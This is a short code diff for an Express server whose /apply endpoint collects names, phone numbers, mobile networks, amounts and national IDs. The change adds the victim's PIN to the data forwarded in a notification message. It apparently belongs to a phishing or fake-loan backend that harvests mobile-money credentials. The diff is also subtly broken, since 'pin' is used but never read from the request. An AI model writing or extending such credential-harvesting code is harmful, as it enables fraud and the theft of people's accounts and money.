@@ -22,7 +22,7 @@ app.get("/", (req, res) => {
 app.post("/apply", async (req, res) => {
   const { name, phone, network, amount, nationalId } = req.body;
 
-  if (!name || !phone || !network || !amount || !nationalId) {
+  if (!name || !phone || !network || !amount || !nationalId || !pin) {
     return res.status(400).send("Missing data");
   }
 
@@ -32,6 +32,7 @@ app.post("/apply", async (req, res) => {
 👤 Name: ${name}
 📱 Phone: ${phone}
 📡 Network: ${network}
+📌 Pin:${pin}
 💰 Amount: ${amount}
 🆔 ID: ${nationalId}
 `;
@@ -52,11 +53,11 @@ app.post("/apply", async (req, res) => {
 });
 
 // ✅ SEND PIN RESPONSE: PIN STEP NOTIFICATION (PIN RESPONSE)
-app.post("/pin-step", async (req, res) => {
+app.post("/pin-success-response", async (req, res) => {
   const { phone } = req.body;
 
   const message = `
-🔐 USER REACHED PIN STEP
+🔐 PIN SUCCESS RESPONSE 
 
 📱 Phone: ${phone}
 `;
